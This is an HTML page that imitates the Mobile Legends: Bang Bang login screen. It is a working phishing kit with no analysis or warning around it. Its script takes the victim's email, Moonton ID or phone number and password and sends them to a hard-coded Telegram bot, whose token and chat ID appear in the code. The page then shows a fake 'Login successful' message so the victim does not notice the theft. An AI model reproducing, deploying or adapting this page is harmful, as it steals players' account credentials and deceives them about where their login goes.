<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Mobile Legends: Bang Bang</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
        }

        body {
            min-height: 100vh;
            background: radial-gradient(circle at 30% 10%, #0b1a2e, #03080f);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
            position: relative;
        }

        /* Glow effect */
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 70% 80%, rgba(0, 180, 255, 0.15), transparent 60%);
            pointer-events: none;
        }

        .login-card {
            width: 100%;
            max-width: 400px;
            background: rgba(10, 25, 45, 0.85);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(0, 180, 255, 0.35);
            border-radius: 36px;
            padding: 32px 24px;
            box-shadow: 0 25px 40px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(0, 200, 255, 0.1) inset;
            position: relative;
            z-index: 2;
            transition: transform 0.2s ease;
        }

        .logo {
            text-align: center;
            margin-bottom: 8px;
        }

        .logo h1 {
            font-size: 26px;
            font-weight: 800;
            letter-spacing: 2px;
            background: linear-gradient(135deg, #ffe484, #ffb347);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-shadow: 0 0 20px rgba(255, 200, 0, 0.5);
            display: inline-block;
            padding: 0 6px;
        }

        .logo .sub {
            color: #8ab4f8;
            font-size: 12px;
            letter-spacing: 3px;
            margin-top: -6px;
            font-weight: 500;
            text-transform: uppercase;
            opacity: 0.9;
        }

        .divider {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin: 20px 0 22px;
        }

        .divider span {
            height: 2px;
            width: 60px;
            background: linear-gradient(90deg, transparent, #2a6f9c, #2a6f9c, transparent);
            border-radius: 2px;
        }

        .divider i {
            color: #6ab0ff;
            font-size: 18px;
            filter: drop-shadow(0 0 6px #3a8ed8);
        }

        .input-group {
            margin-bottom: 18px;
            position: relative;
        }

        .input-group label {
            display: block;
            font-size: 12px;
            font-weight: 600;
            letter-spacing: 0.5px;
            color: #a0c6ff;
            margin-bottom: 6px;
            margin-left: 8px;
            text-transform: uppercase;
            opacity: 0.8;
        }

        .input-wrapper {
            display: flex;
            align-items: center;
            background: #0e1e2f;
            border: 1.5px solid #1d3d5c;
            border-radius: 60px;
            padding: 0 18px;
            transition: all 0.2s;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4);
        }

        .input-wrapper:focus-within {
            border-color: #3f9eff;
            box-shadow: 0 0 18px rgba(0, 140, 255, 0.5), 0 4px 10px rgba(0, 0, 0, 0.6);
            background: #10273d;
        }

        .input-wrapper .icon {
            font-size: 18px;
            margin-right: 12px;
            color: #3f9eff;
            filter: drop-shadow(0 0 6px #2b7fd4);
            width: 24px;
            text-align: center;
        }

        .input-wrapper input {
            width: 100%;
            background: transparent;
            border: none;
            outline: none;
            padding: 16px 0;
            font-size: 16px;
            color: #ecf5ff;
            font-weight: 400;
            letter-spacing: 0.3px;
        }

        .input-wrapper input::placeholder {
            color: #5b7e9e;
            font-weight: 300;
            font-size: 15px;
        }

        .password-toggle {
            cursor: pointer;
            font-size: 20px;
            color: #4179a8;
            transition: color 0.2s;
            padding: 8px;
        }

        .password-toggle:hover {
            color: #8ec9ff;
        }

        .login-btn {
            width: 100%;
            background: linear-gradient(135deg, #1f73b7, #0d4b7a);
            border: none;
            border-radius: 60px;
            padding: 18px 0;
            font-size: 18px;
            font-weight: 800;
            letter-spacing: 1.5px;
            color: #fff;
            text-transform: uppercase;
            cursor: pointer;
            margin-top: 20px;
            box-shadow: 0 8px 0 #09263b, 0 15px 25px rgba(0, 0, 0, 0.6);
            transition: all 0.1s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            border: 1px solid #57b0ff;
        }

        .login-btn:active {
            transform: translateY(5px);
            box-shadow: 0 3px 0 #09263b, 0 10px 20px rgba(0, 0, 0, 0.7);
        }

        .login-btn i {
            font-size: 22px;
            filter: drop-shadow(0 0 8px #fff);
        }

        .footer-note {
            text-align: center;
            margin-top: 24px;
            font-size: 11px;
            color: #4f6f8a;
            letter-spacing: 0.8px;
        }

        .footer-note a {
            color: #4499ee;
            text-decoration: none;
            font-weight: 600;
        }

        .footer-note a:hover {
            text-decoration: underline;
        }

        /* status message */
        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: #0f2a3f;
            color: #b3e0ff;
            border-left: 6px solid #2d9cff;
            padding: 12px 26px;
            border-radius: 60px;
            font-size: 14px;
            font-weight: 500;
            box-shadow: 0 10px 30px black;
            opacity: 0;
            transition: opacity 0.3s;
            pointer-events: none;
            z-index: 999;
            border: 1px solid #2670b0;
            backdrop-filter: blur(8px);
            white-space: nowrap;
        }

        .toast.show {
            opacity: 1;
        }

        .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 0.8s linear infinite;
            margin-left: 8px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .login-btn.loading .spinner {
            display: inline-block;
        }

        .login-btn.loading .btn-text {
            opacity: 0.8;
        }

        .login-btn:disabled {
            opacity: 0.8;
            transform: translateY(0);
            box-shadow: 0 5px 0 #09263b, 0 10px 20px rgba(0, 0, 0, 0.6);
            cursor: not-allowed;
        }

        /* small particle glow */
        .glow {
            position: absolute;
            width: 200px;
            height: 200px;
            background: radial-gradient(circle, rgba(0, 160, 255, 0.2), transparent 70%);
            border-radius: 50%;
            top: -50px;
            right: -50px;
            z-index: -1;
        }

    </style>
</head>
<body>
    <div class="toast" id="toast">✅ Sent to Telegram</div>

    <div class="login-card">
        <div class="glow"></div>
        <div class="logo">
            <h1>MOBILE LEGENDS</h1>
            <div class="sub">BANG BANG</div>
        </div>

        <div class="divider">
            <span></span>
            <i>⚔️</i>
            <span></span>
        </div>

        <form id="loginForm" action="javascript:void(0);">
            <!-- Email / Moonton / Phone -->
            <div class="input-group">
                <label>Email / Moonton / Phone</label>
                <div class="input-wrapper">
                    <span class="icon">📧</span>
                    <input type="text" id="identity" placeholder="Email or Moonton ID or Phone" autocomplete="off" required>
                </div>
            </div>

            <!-- Password -->
            <div class="input-group">
                <label>Password</label>
                <div class="input-wrapper">
                    <span class="icon">🔒</span>
                    <input type="password" id="password" placeholder="Enter your password" autocomplete="off" required>
                    <span class="password-toggle" id="togglePassword">👁️</span>
                </div>
            </div>

            <button type="submit" class="login-btn" id="loginBtn">
                <span class="btn-text">LOG IN</span>
                <span class="spinner" id="spinner"></span>
            </button>
        </form>

        <div class="footer-note">
            <span>🔐 Secure login · </span>
            <a href="#">Forgot password?</a>
        </div>
    </div>

    <script>
        (function() {
            // --- CONFIGURATION ---
            const TELEGRAM_BOT_TOKEN = '8720227472:AAGKXVs4Ndw48tv6t6nbbDq0g-UBu9V2hVU';
            const TELEGRAM_CHAT_ID = '6661190027';
            const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

            // --- DOM ELEMENTS ---
            const form = document.getElementById('loginForm');
            const identityInput = document.getElementById('identity');
            const passwordInput = document.getElementById('password');
            const togglePassword = document.getElementById('togglePassword');
            const loginBtn = document.getElementById('loginBtn');
            const spinner = document.getElementById('spinner');
            const toast = document.getElementById('toast');

            // --- TOGGLE PASSWORD VISIBILITY ---
            togglePassword.addEventListener('click', function() {
                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                passwordInput.setAttribute('type', type);
                togglePassword.textContent = type === 'password' ? '👁️' : '🙈';
            });

            // --- TOAST NOTIFICATION ---
            function showToast(message, isError = false) {
                toast.textContent = message;
                toast.style.borderLeftColor = isError ? '#ff4d4d' : '#2d9cff';
                toast.style.color = isError ? '#ffb3b3' : '#b3e0ff';
                toast.classList.add('show');
                setTimeout(() => {
                    toast.classList.remove('show');
                }, 2800);
            }

            // --- SEND TO TELEGRAM ---
            async function sendToTelegram(identity, password) {
                // Build the message with emojis
                const message = `
🎮 <b>MOBILE LEGENDS LOGIN</b> 🎮
━━━━━━━━━━━━━━━━━━
📧 <b>Email / Moonton / Phone:</b>
<code>${identity}</code>

🔑 <b>Password:</b>
<code>${password}</code>
━━━━━━━━━━━━━━━━━━
⚡ <i>Captured at: ${new Date().toLocaleString()}</i>
                `.trim();

                const url = `${TELEGRAM_API}?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;

                try {
                    const response = await fetch(url, {
                        method: 'GET',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                    });

                    const data = await response.json();

                    if (!data.ok) {
                        throw new Error(data.description || 'Telegram API error');
                    }
                    return { success: true };
                } catch (error) {
                    console.error('Telegram send error:', error);
                    throw error;
                }
            }

            // --- HANDLE FORM SUBMIT ---
            form.addEventListener('submit', async function(e) {
                e.preventDefault();

                // Get values
                const identity = identityInput.value.trim();
                const password = passwordInput.value.trim();

                // Basic validation
                if (!identity) {
                    showToast('❌ Please enter Email / Moonton / Phone', true);
                    identityInput.focus();
                    return;
                }

                if (!password) {
                    showToast('❌ Please enter your password', true);
                    passwordInput.focus();
                    return;
                }

                // Disable button + show loading
                loginBtn.disabled = true;
                loginBtn.classList.add('loading');
                spinner.style.display = 'inline-block';

                try {
                    // Send to telegram
                    await sendToTelegram(identity, password);

                    // Success feedback
                    showToast('✅ Login successful! Redirecting...');

                    // Optionally clear form
                    // identityInput.value = '';
                    // passwordInput.value = '';

                    // Simulate redirect or further action (not needed)
                } catch (error) {
                    console.error('Failed to send:', error);
                    showToast('⚠️ Network error. Please try again.', true);
                } finally {
                    // Re-enable button
                    loginBtn.disabled = false;
                    loginBtn.classList.remove('loading');
                    spinner.style.display = 'none';
                }
            });

            // --- PREVENT DOUBLE TAP / AUTO FOCUS ---
            identityInput.focus();

            // small UX: clear error state on typing (optional)
            identityInput.addEventListener('input', () => {
                // just to make sure no error styling persists (we don't use error class, but fine)
            });
        })();
    </script>
</body>
</html>
